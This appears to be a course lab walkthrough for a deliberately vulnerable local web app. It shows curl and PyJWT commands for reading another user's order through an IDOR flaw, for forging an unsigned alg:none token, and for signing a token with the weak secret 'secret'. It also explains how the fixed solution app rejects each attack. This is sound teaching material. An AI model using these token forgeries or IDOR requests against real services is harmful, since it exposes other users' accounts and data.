# Week 6 — Attack walkthrough (sandbox only)

App runs on `http://localhost:8080`. Start it with `docker compose up`.

## 0. Log in as alice (get a token)

```bash
TOKEN=$(curl -s -X POST http://localhost:8080/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"alice","pw":"alicepw"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
echo "$TOKEN"
```

## 1. IDOR — read another user's order (CWE-639)

Alice's token reads bob's order #2 because there is no ownership check:

```bash
# Alice's own order (id 1) — expected
curl -s http://localhost:8080/api/orders/1 -H "Authorization: Bearer $TOKEN"
# Bob's order (id 2) — should be forbidden, but the vulnerable app returns it
curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $TOKEN"
```

In `solution_app.py` the second call returns `403 forbidden`.

## 2. Forged token — alg:none (CWE-347)

Mint an UNSIGNED token claiming to be bob. The vulnerable app allows `none`, so no secret is needed:

```bash
FORGED=$(python3 - <<'PY'
import jwt
# alg 'none' produces an unsigned token; key must be empty for PyJWT.
print(jwt.encode({"sub": "bob"}, key="", algorithm="none"))
PY
)
curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"
```

## 3. Forged token — weak HMAC secret "secret" (CWE-321)

Since the secret is the guessable string `secret`, anyone can sign a valid token:

```bash
FORGED2=$(python3 - <<'PY'
import jwt
print(jwt.encode({"sub": "bob"}, "secret", algorithm="HS256"))
PY
)
curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED2"
```

Against `solution_app.py` both forged tokens fail: `none` is rejected (algorithm pinned to
`HS256`), the secret is strong/random, and tokens must carry a valid `exp` and `aud`.
